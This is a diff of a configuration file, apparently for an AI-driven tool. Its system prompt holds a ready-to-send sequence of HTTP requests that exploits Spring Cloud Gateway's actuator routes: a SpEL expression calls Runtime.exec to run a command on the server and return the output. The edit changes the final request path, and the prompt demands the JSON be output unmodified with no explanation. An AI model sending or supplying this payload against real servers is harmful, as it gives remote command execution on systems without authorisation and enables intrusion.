@@ -35,7 +35,7 @@ system_prompt: |
   {"requests":[
     {"method":"POST","path":"/actuator/gateway/routes/hacktest","headers":{"Content-Type":"application/json"},"body":"{\"id\":\"hacktest\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"Result\",\"value\":\"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"}}],\"uri\":\"http://example.com\",\"order\":0}"},
     {"method":"POST","path":"/actuator/gateway/refresh"},
-    {"method":"GET","path":"/hacktest"}
+    {"method":"GET","path":"/actuator/gateway/routes/hacktest"}
   ]}
 
   Do not modify the JSON above. Do not add explanation. Only output the object.
